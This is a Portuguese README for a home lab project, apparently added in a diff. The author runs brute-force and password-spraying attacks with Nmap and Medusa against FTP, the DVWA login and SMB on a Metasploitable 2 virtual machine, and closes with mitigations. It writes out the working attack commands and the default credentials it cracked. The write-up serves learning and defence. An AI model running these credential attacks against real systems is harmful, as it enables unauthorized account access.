@@ -1,0 +1,192 @@
+1. Objetivo
+
+Neste projeto eu simulei ataques de força bruta em um ambiente controlado.
+A ideia foi entender como ataques reais funcionam e como sistemas vulneráveis se comportam.
+
+Eu foquei em três cenários:
+
+• FTP
+• Login web com DVWA
+• SMB com password spraying
+
+2. Ambiente utilizado
+
+Montei um laboratório simples com duas máquinas virtuais.
+
+• Kali Linux
+• Metasploitable 2
+
+Ambas rodando no VirtualBox.
+
+Configuração de rede:
+
+• Tipo: Host-Only
+• Comunicação direta entre as máquinas
+• Sem acesso externo
+
+3. Descoberta do alvo
+
+Primeiro identifiquei o IP da máquina vulnerável.
+
+No Metasploitable:
+
+ifconfig
+
+IP encontrado: 192.168.135.3
+
+4. Teste de conectividade
+
+No Kali validei conexão com o alvo:
+
+ping 192.168.135.3
+
+Resultado:
+
+• Comunicação funcionando
+• Pacotes sendo enviados e recebidos
+
+5. Enumeração de serviços
+
+Usei o Nmap para identificar portas abertas:
+
+nmap -sV 192.168.135.3
+
+Principais serviços encontrados:
+
+• 21 → FTP
+• 80 → HTTP
+• 445 → SMB
+
+Esses serviços foram usados nos ataques.
+
+6. Criação das wordlists
+
+Criei listas simples de usuários e senhas para simular ataques reais.
+
+Arquivo de usuários:
+
+echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
+
+Arquivo de senhas:
+
+echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
+
+Para SMB usei outra lista:
+
+echo -e "user\nmsfadmin\nservice" > smb_users.txt
+
+echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
+
+7. Ataque de força bruta em FTP
+
+Executei o ataque com Medusa:
+
+medusa -h 192.168.135.3 -U users.txt -P pass.txt -M ftp
+
+Resultado:
+
+• Credencial encontrada
+Usuário: msfadmin
+Senha: msfadmin
+
+Isso mostra uso de senha fraca.
+
+8. Ataque no login web (DVWA)
+
+Acessei a aplicação:
+
+http://192.168.135.3/dvwa
+
+Login inicial:
+
+admin / password
+
+Configuração:
+
+• Security level: LOW
+
+Depois executei o ataque:
+
+medusa -h 192.168.135.3 -U users.txt -P pass.txt -M http
+-m PAGE:'/dvwa/login.php'
+-m FORM:'username=^USER^&password=^PASS^&Login=Login'
+-m 'FAIL=Login failed' -t 6
+
+Resultado:
+
+• Login válido encontrado
+
+Isso mostra falta de proteção contra brute force.
+
+9. Ataque SMB com password spraying
+
+Executei o ataque:
+
+medusa -h 192.168.135.3 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
+
+Objetivo:
+
+• Testar poucas senhas em vários usuários
+• Evitar bloqueio por tentativa repetida
+
+Resultado:
+
+• Acesso válido encontrado
+
+10. Resultados gerais
+
+Durante os testes eu consegui acesso em todos os serviços testados.
+
+Principais pontos:
+
+• Senhas fracas foram quebradas rápido
+• Não existe limite de tentativas
+• Não há bloqueio de conta
+• Nenhum sistema detectou o ataque
+
+11. Vulnerabilidades identificadas
+
+• Uso de senhas comuns
+• Ausência de rate limit
+• Falta de monitoramento
+• Falta de autenticação forte
+
+12. Medidas de mitigação
+
+Para evitar esse tipo de ataque:
+
+• Definir senhas fortes
+• Implementar MFA
+• Limitar tentativas de login
+• Bloquear IP após falhas
+• Monitorar logs de acesso
+• Usar ferramentas de detecção
+
+13. Aprendizado
+
+Com esse projeto eu entendi na prática:
+
+• Como ataques de força bruta funcionam
+• Como ferramentas como Medusa operam
+• A importância da enumeração antes do ataque
+• Como sistemas mal configurados são explorados
+
+Também ficou claro que segurança fraca abre portas rapidamente.
+
+14. Estrutura do projeto
+
+• README.md
+• users.txt
+• pass.txt
+• smb_users.txt
+• senhas_spray.txt
+• /images com prints
+
+15. Conclusão
+
+O laboratório mostrou na prática como ataques simples funcionam.
+
+Sem proteção básica, o acesso acontece rápido.
+Mesmo com ferramentas simples, o impacto é alto.
+
+Esse tipo de teste ajuda a entender onde melhorar a segurança.
